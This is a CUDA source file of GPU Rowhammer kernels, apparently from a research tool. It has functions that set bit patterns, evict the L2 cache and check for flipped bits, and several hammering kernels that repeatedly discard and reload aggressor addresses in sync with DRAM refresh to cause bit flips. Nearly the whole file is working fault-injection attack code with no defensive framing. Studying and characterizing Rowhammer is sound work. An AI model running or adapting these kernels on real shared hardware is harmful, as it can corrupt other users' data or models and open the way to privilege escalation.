#include <rh_kernels.cuh>

/**
 * @brief Sets the address byte identified by the thread offset to value.
 *
 * @param addr_arr array of GPU addresses
 * @param value 8-bit byte value
 * @param b_len maximum offset
 */
__global__ void set_address_kernel(uint8_t *addr_arr, uint64_t value,
                                   uint64_t b_len)
{
  int offset = threadIdx.x + blockIdx.x * blockDim.x;
  if (offset < b_len)
  {
    asm volatile("{\n\t"
                 "st.u8.global.wt [%0], %1;\n\t"
                 "}" ::"l"(addr_arr + offset),
                 "l"(value));
  }
}



// Each thread writes one byte of the 256-byte (b_len) region.
// Within every 32-byte word, all bytes are 0xFF except the byte that
// contains `bit_pos` (relative to the word start), which has a 0 at
// exactly that bit and 1s everywhere else.
__global__ void set_address_bit_kernel(uint8_t *addr_arr, uint64_t bit_pos,
                                       uint64_t b_len)
{
  int offset = threadIdx.x + blockIdx.x * blockDim.x;
  if (offset >= b_len)
    return;

  // Which byte inside the current 32-byte word does this thread own?
  const uint64_t WORD_BYTES = 32;
  uint64_t byte_in_word = offset % WORD_BYTES;

  // The byte index (within the word) that holds the target bit
  // bit_pos is a bit-offset within the 32-byte word (0-255)
  uint64_t target_byte = bit_pos / 8;
  uint64_t target_bit  = bit_pos % 8;  // which bit inside that byte

  uint8_t val;
  if (byte_in_word == target_byte)
    val = ~(1u << target_bit);  // 0xFF with a single 0 at the target bit
  else
    val = 0xFF;

  asm volatile("{\n\t"
               "st.u8.global.wt [%0], %1;\n\t"
               "}" ::"l"(addr_arr + offset),
               "l"((uint64_t)val));
}

/**
 * @brief Discard the given address addr for the step size, e.g.
 * if step=256, we will call discard on addr and addr + 128
 *
 * @param addr GPU address value
 * @param step step size
 */
__global__ void clear_address_kernel(uint8_t *addr, uint64_t step)
{
  for (uint64_t i = 0; i < step; i += 128)
    asm volatile("{\n\t"
                 "discard.global.L2 [%0], 128;\n\t"
                 "}" ::"l"(addr));
}

/**
 * @brief Verify that a particular byte is the expected target value.
 *
 * @param addr_arr array of GPU addresses
 * @param target expected value of the byte
 * @param b_len number of bytes in total, used for indexing
 * @return @param has_diff return value for host to know whether a difference occured
 */
__global__ void verify_result_kernel(uint8_t **addr_arr, uint64_t target,
  uint64_t b_len, bool *has_diff, int *row_ids)
{
  uint64_t value = 0;

  int addr_id = (threadIdx.x + blockIdx.x * blockDim.x) / b_len;
  int byte_id = (threadIdx.x + blockIdx.x * blockDim.x) % b_len;
  asm volatile("{\n\t"
                "ld.u8.global.volatile %0, [%1];\n\t"
                "}"
                : "=l"(value)
                : "l"(*(addr_arr + addr_id) + byte_id));

  int diff = target ^ value; // XOR

  if (diff != 0)
  {
    if (has_diff) *has_diff = true;
    int diff_count = __popcll(diff);
    int bit_pos = __ffsll(diff) - 1;
    int from_bit = (target >> bit_pos) & 1;
    int to_bit   = (value  >> bit_pos) & 1;
    
    printf("\nBit-flip detected!\n");
    printf("Observed %d bit-flip(s) in Row %d, Byte %d, Address %p\n"
    "The %dth bit flipped from %d to %d (Data Pattern: 0x%02lx -> 0x%02lx)\n\n",
           diff_count, row_ids[addr_id], byte_id, 
           *(addr_arr + addr_id) + byte_id, bit_pos, from_bit, to_bit, target, value);

  }
}


__global__ void verify_result_bit_kernel(uint8_t **addr_arr, uint64_t bit_pos,
                                         uint64_t b_len, bool *has_diff, int *row_ids)
{
  const uint64_t WORD_BYTES = 32;

  int global_id = threadIdx.x + blockIdx.x * blockDim.x;
  int addr_id   = global_id / b_len;
  int byte_id   = global_id % b_len;

  // Reconstruct the expected byte the same way set_address_bit_kernel does
  uint64_t byte_in_word  = byte_id % WORD_BYTES;
  uint64_t target_byte   = bit_pos / 8;
  uint64_t target_bit    = bit_pos % 8;

  uint8_t expected = (byte_in_word == target_byte)
                       ? (uint8_t)(~(1u << target_bit))  // 0xFF with one 0-bit
                       : 0xFF;

  uint64_t value = 0;
  asm volatile("{\n\t"
               "ld.u8.global.volatile %0, [%1];\n\t"
               "}"
               : "=l"(value) : "l"(*(addr_arr + addr_id) + byte_id));

  int diff = expected ^ (uint8_t)value;

  if (diff != 0)
  {
    if (has_diff) *has_diff = true;
    int diff_count = __popcll(diff);
    int flipped_bit = __ffsll(diff) - 1;
    int from_bit = (expected >> flipped_bit) & 1;
    int to_bit   = (value    >> flipped_bit) & 1;

    // Report the absolute bit position within the 32B word for clarity
    uint64_t abs_bit = byte_in_word * 8 + flipped_bit;

    printf("\nBit-flip detected!\n"
           "Observed %d bit-flip(s) in Row %d, Byte %d (word-bit %llu), Address %p\n"
           "Bit %d flipped from %d to %d "
           "(Expected: 0x%02x -> Got: 0x%02lx, injected-zero at word-bit %llu)\n\n",
           diff_count, row_ids[addr_id], byte_id, abs_bit,
           *(addr_arr + addr_id) + byte_id,
           flipped_bit, from_bit, to_bit,
           expected, value, bit_pos);
  }
}

/**
 * @brief Evict the L2 Cache by iterating through a large portion of the memory space
 *
 * @param addr start address of the GPU memory space
 * @param size size of the memory space to iterate
 */
__global__ void evict_kernel(uint8_t *addr, uint64_t size)
{ 
  uint64_t temp, ret = 0;
  uint64_t offset = threadIdx.x * size;

  for (int i = 0 ; i < size; i += 128) {
    asm volatile("{\n\t"
               "ld.u8.global.volatile %0, [%1];\n\t"
               "}"
               : "=l"(temp)
               : "l"(addr + offset + i));
    ret += temp;
  }
  if (threadIdx.x == 0) printf("%ld\n", ret);
}

/**
 * @brief Naive implementation of Rowhammer. Every thread accesses a unique address
 * in addr_arr for count amount of times.
 *
 * @param addr_arr array of GPU addresses to hammer.
 * @param count number of times to iterate.
 * @return @param time spent for the entire hammering.
 */
__global__ void simple_hammer_kernel(uint8_t **addr_arr, uint64_t count,
                                     uint64_t *time)
{
  uint64_t temp __attribute__((unused));
  uint64_t ce, cs;
  uint8_t *addr = *(addr_arr + threadIdx.x);

  cs = clock64();
  for (; count--;)
  {
    asm volatile("{\n\t"
                 "discard.global.L2 [%0], 128;\n\t"
                 "}" ::"l"(addr));

    asm volatile("{\n\t"
                 "ld.u8.global.volatile %0, [%1];\n\t"
                 "}"
                 : "=l"(temp)
                 : "l"(addr));
  }
  ce = clock64();
  *time = ce - cs;
}

/**
 * @brief Simulating a single threaded hammering in CPU. Only have 1 thread
 * and iterate through the addr_arr in order for count times.
 *
 * @param addr_arr array of GPU addresses to hammer.
 * @param count number of times to iterate.
 * @param n number of entries in addr_arr
 * @return @param time spent for the entire hammering.
 */
__global__ void single_thread_hammer_kernel(uint8_t **addr_arr, uint64_t count, uint64_t n, uint64_t *time)
{
  uint64_t temp __attribute__((unused));
  uint64_t ce, cs;
  cs = clock64();
  for (; count--;)
  {
    for (uint64_t i = 0; i < n; i++)
    {
      asm volatile("{\n\t"
                  "discard.global.L2 [%0], 128;\n\t"
                  "}" ::"l"(addr_arr[i]));
      asm volatile("{\n\t"
                  "ld.u8.global.volatile %0, [%1];\n\t"
                  "}"
                  : "=l"(temp)
                  : "l"(addr_arr[i]));
    }
  }
  ce = clock64();
  *time = ce - cs;
}

/**
 * @brief Hammering with multi-threaded approach and refresh synchronization.
 *
 * @param addr_arr array of GPU addresses to hammer.
 * @param count number of times to iterate a round of hammering process (period + delay)
 * @param delay amount of additions
 * @param period how many rounds of hammering before we add delay
 * @return @param time spent for the entire hammering.
 */
__global__ void sync_hammer_kernel(uint8_t **addr_arr, uint64_t count,
                                   uint64_t delay, uint64_t period,
                                   uint64_t *time)
{
  uint64_t temp, ret = 0, ce, cs, i;
  uint8_t *addr = *(addr_arr + threadIdx.x);
  cs = clock64();

  for (; count--;)
  {
    for (i = delay; i--;)
    {
      asm volatile("{\n\t"
                   "add.u64 %0, %1, %2;\n\t"
                   "}"
                   : "=l"(ret)
                   : "l"(ret), "l"(temp));
    }
    for (i = period; i--;)
    {
      asm volatile("{\n\t"
                   "discard.global.L2 [%0], 128;\n\t"
                   "}" ::"l"(addr));
      asm volatile("{\n\t"
                   "ld.u8.global.volatile %0, [%1];\n\t"
                   "}"
                   : "=l"(temp)
                   : "l"(addr));
    }
  }
  ce = clock64();
  *time = ce - cs;
}

/**
 * @brief Hammering with multi-warp approach and refresh synchronization.
 *
 * @param addr_arr array of GPU addresses to hammer.
 * @param count number of times to iterate a round of hammering process (period + delay)
 * @param n total number of warps
 * @param k total number of threads
 * @param len total number of aggressors (may be different than n * k)
 * @param delay amount of additions
 * @param period how many rounds of hammering before we add delay
 * @return @param time spent for the entire hammering.
 */
__global__ void warp_simple_hammer_kernel(uint8_t **addr_arr, uint64_t count, 
                                          uint64_t n, uint64_t k, uint64_t len, 
                                          uint64_t delay, uint64_t period, 
                                          uint64_t* time)
{
  /* n: warp, k: threads */
  uint64_t ret = 0, temp, cs, ce;
  uint64_t warpId = threadIdx.x / 32;
  uint64_t threadId_in_warp = threadIdx.x % 32;

  if (warpId < n && threadId_in_warp < k && threadId_in_warp + warpId * k < len)
  {
    uint8_t *addr = *(addr_arr + threadId_in_warp + warpId * k);
    // uint8_t *addr = *(addr_arr + threadId_in_warp * n + warpId);
    asm volatile("{\n\t"
               "discard.global.L2 [%0], 128;\n\t"
               "}" ::"l"(addr));

    // Use warp 0 thread 0 as the timer to avoid extra delays
    if (threadIdx.x == 0)
      cs = clock64();

    __syncthreads();
    
    // Add initial delays to force ordering of warps
    for (uint64_t i = 3 * warpId; i--;){
      ret += temp;
    }

    // Initial round of accesses to fill the pipeline
    for (uint64_t i = period; i--;){
      asm volatile("{\n\t"
                  "discard.global.L2 [%1], 128;\n\t"
                  "ld.u8.global.volatile %0, [%1];\n\t"
                  "}"
                  : "=l"(temp)
                  : "l"(addr));
      __threadfence_block();
    }

    // Original hammering loop
    for (;count--;)
    {
      for (uint64_t i = period; i--;){
        asm volatile("{\n\t"
                    "discard.global.L2 [%1], 128;\n\t"
                    "ld.u8.global.volatile %0, [%1];\n\t"
                    "}"
                    : "=l"(temp)
                    : "l"(addr));
        __threadfence_block();
      }
      for (uint64_t i = delay; i--;){
        ret += temp;
      }
    }
    
    __syncthreads();
    if (threadIdx.x == 0)
      ce = clock64();
    __syncthreads();
    if (threadIdx.x == 0){
      printf("%u, %ld, %ld, %ld, %ld\n", threadIdx.x, warpId, temp, ret, ce - cs);
             * time = ce - cs;
    }
  }
}

__global__ void gputhor_hammer(uint8_t **addr_arr, uint64_t count, 
                                          uint64_t n, uint64_t k, uint64_t len,
                                          uint64_t delay, uint64_t period, int trefi,
                                          uint64_t* time)
{
  /* n: warp, k: threads */
  uint64_t ret = 0, temp, cs, ce;
  uint64_t warpId = threadIdx.x / 32;
  uint64_t threadId_in_warp = threadIdx.x % 32;

  if (warpId < n && threadId_in_warp < k && threadId_in_warp + warpId * k < len)
  {
    // uint8_t * addrs[2];
    uint8_t *addr1 = *(addr_arr + threadId_in_warp + warpId * k);
    uint8_t *addr2 = *(addr_arr + len + threadId_in_warp + warpId * k);
    asm volatile("{\n\t"
    "discard.global.L2 [%0], 128;\n\t"
    "}" ::"l"(addr1));
    asm volatile("{\n\t"
    "discard.global.L2 [%0], 128;\n\t"
    "}" ::"l"(addr2));

    // Use warp 0 thread 0 as the timer to avoid extra delays
    if (threadIdx.x == 0)
      cs = clock64();

    __syncthreads();
    
    // Add initial delays to force ordering of warps
    for (uint64_t i = 3 * warpId; i--;){
      ret += temp;
    }

    // Initial round of accesses to fill the pipeline
    // for (uint64_t i = period; i--;){
    asm volatile("{\n\t"
                "discard.global.L2 [%1], 128;\n\t"
                "ld.u8.global.volatile %0, [%1];\n\t"
                "}"
                : "=l"(temp)
                : "l"(addr2));
    __threadfence_block();
    // }

    // Original hammering loop
    for (;count--;)
    {
        asm volatile("{\n\t"
                    "discard.global.L2 [%1], 128;\n\t"
                    "ld.u8.global.volatile %0, [%1];\n\t"
                    "}"
                    : "=l"(temp)
                    : "l"(count % trefi == 0 ? addr2 : addr1));
        __threadfence_block();
      // }
      for (uint64_t i = delay; i--;){
        ret += temp;
      }
    }
    
    __syncthreads();
    if (threadIdx.x == 0)
      ce = clock64();
    __syncthreads();
    if (threadIdx.x == 0){
      printf("%u, %ld, %ld, %ld, %ld\n", threadIdx.x, warpId, temp, ret, ce - cs);
             * time = ce - cs;
    }
  }
}


__global__ void gputhor_nonuniform_kernel(uint8_t **addr_arr, uint64_t count, 
                                      uint64_t n, uint64_t k, uint64_t len,
                                      uint64_t delay, uint64_t period, int trefi,
                                      uint64_t* time)
{
  /* n: warp, k: threads */
  uint64_t ret = 0, temp, cs, ce;
  uint64_t warpId = threadIdx.x / 32;
  uint64_t threadId_in_warp = threadIdx.x % 32;

  int ntrefi = trefi;
  if (warpId < n && threadId_in_warp < k && threadId_in_warp + warpId * k < len)
  {
    uint8_t * addrs[36];
    for (int i = 0; i < ntrefi; i++) {
      addrs[i] = *(addr_arr + len * i + threadId_in_warp + warpId * k);
      asm volatile("{\n\t"
        "discard.global.L2 [%0], 128;\n\t"
        "}" ::"l"(addrs[i]));
    }

    // Use warp 0 thread 0 as the timer to avoid extra delays
    if (threadIdx.x == 0)
      cs = clock64();

    __syncthreads();
    
    // Add initial delays to force ordering of warps
    for (uint64_t i = 3 * warpId; i--;){
      ret += temp;
    }

    // Initial round of accesses to fill the pipeline
    // for (uint64_t i = period; i--;){
    asm volatile("{\n\t"
                "discard.global.L2 [%1], 128;\n\t"
                "ld.u8.global.volatile %0, [%1];\n\t"
                "}"
                : "=l"(temp)
                : "l"(addrs[0]));
    __threadfence_block();
    // }

    // Original hammering loop
    count -= count % ntrefi;
    for (;count -= ntrefi;)
    {
      for (int i = 0; i < ntrefi; i++) {
        asm volatile("{\n\t"
                    "discard.global.L2 [%1], 128;\n\t"
                    "ld.u8.global.volatile %0, [%1];\n\t"
                    "}"
                    : "=l"(temp)
                    : "l"(addrs[i]));
        __threadfence_block();
        for (uint64_t j = delay; j--;){
          ret += temp;
        }
      }
    }
    
    __syncthreads();
    if (threadIdx.x == 0)
      ce = clock64();
    __syncthreads();
    if (threadIdx.x == 0){
      printf("%u, %ld, %ld, %ld, %ld\n", threadIdx.x, warpId, temp, ret, ce - cs);
             * time = ce - cs;
    }
  }
}

__global__ void rh_threshold_kernel(uint8_t **agg_arr, uint8_t **dum_arr, 
                                    uint64_t count, uint64_t n, uint64_t k, 
                                    uint64_t len, uint64_t delay, uint64_t period,
                                    uint64_t* time, 
                                    uint64_t agg_period, uint64_t dum_period)
{
  /* n: warp, k: threads */
  uint64_t ret = 0, temp, cs, ce;
  uint64_t warpId = threadIdx.x / 32;
  uint64_t threadId_in_warp = threadIdx.x % 32;

  if (warpId < n && threadId_in_warp < k && threadId_in_warp + warpId * k < len)
  {
    uint8_t *agg = *(agg_arr + threadId_in_warp + warpId * k);
    uint8_t *dum = *(dum_arr  + threadId_in_warp + warpId * k);

    asm volatile("{\n\t"
               "discard.global.L2 [%0], 128;\n\t"
               "}" ::"l"(agg));
    asm volatile("{\n\t"
               "discard.global.L2 [%0], 128;\n\t"
               "}" ::"l"(dum));

    if (threadIdx.x == 0)
      cs = clock64();
    __syncthreads();

    for (;count--;)
    {
      // Access agg
      for (uint64_t j = agg_period; j--;){
        for (uint64_t i = period; i--;){
          asm volatile("{\n\t"
                      "discard.global.L2 [%1], 128;\n\t"
                      "ld.u8.global.volatile %0, [%1];\n\t"
                      "}"
                      : "=l"(temp)
                      : "l"(agg));
          __threadfence_block();
        }
        for (uint64_t i = delay; i--;){
          ret += temp;
        }
      }
      // Access dummy
      for (uint64_t j = dum_period; j--;){
        for (uint64_t i = period; i--;){
          asm volatile("{\n\t"
                      "discard.global.L2 [%1], 128;\n\t"
                      "ld.u8.global.volatile %0, [%1];\n\t"
                      "}"
                      : "=l"(temp)
                      : "l"(dum));
          __threadfence_block();
        }
        for (uint64_t i = delay; i--;){
          ret += temp;
        }
      }
    }

    __syncthreads();
    if (threadIdx.x == 0)
      ce = clock64();
    __syncthreads();
    if (threadIdx.x == 0){
      printf("%u, %ld, %ld, %ld\n", threadIdx.x, warpId, temp, ret);
             * time = ce - cs;
    }
  }
}
